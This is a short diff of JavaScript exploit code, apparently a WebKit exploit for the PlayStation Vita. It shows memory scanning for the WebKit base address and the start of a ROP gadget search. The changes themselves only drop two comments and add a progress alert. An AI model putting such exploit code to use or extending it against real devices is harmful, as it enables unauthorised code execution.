@@ -8,7 +8,6 @@ var _gc, _cnt = 0;
 var u32;
 var u32addr;
 var u32base;
-//var webkit;
 
 function tryExpl_vita(att)
 {
@@ -221,7 +220,6 @@ function exec()
                 (String.fromCharCode(getU8(i+8)) == 't'))
             {
                 webkit = i;
-                //logAdd("webkit address = 0x" + webkit.toString(16));
                 break;
             }
         }
@@ -229,7 +227,9 @@ function exec()
         var gadget1 = 0;
         var gadget2 = 0;
         var gadget3 = 0;
-        
+
+	alert("Press OK, the process may take a few minutes. Found webkit at:" + webkit.toString(16));
+
         for (var i = webkit; ; i-=2)
         {
             // check for gadget 1
